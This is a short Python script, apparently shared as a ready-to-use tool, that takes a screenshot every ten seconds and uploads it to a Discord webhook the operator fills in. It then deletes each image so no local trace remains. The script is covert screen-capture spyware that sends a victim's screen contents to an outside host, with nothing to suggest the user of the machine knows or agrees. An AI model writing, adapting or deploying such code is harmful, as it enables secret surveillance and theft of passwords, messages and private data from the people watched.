import pyautogui
import discord
import dhooks
import os
import time

# it take a screenshot
def screen():
	pic = pyautogui.screenshot()
	pic.save(r'C:\\pic\\screen.png')

# it send ti to you're webhook
def hooksend():
	hook = dhooks.Webhook('WEBHOOK HERE PLEASE')
	file = dhooks.File('C:\\pic\\screen.png', name='sreen.png')
	hook.send(file=file)
# it delet the screenshot - comment if you want the screenshot to stay in the folder
def cleaner():
	os.remove("C:\\pic\\screen.png")



while True:
#it wait 10 seconds then take another screenshot and send it (remove "time.sleep(10)" to delet it)
	time.sleep(10)
	screen()
	hooksend()
	cleaner()
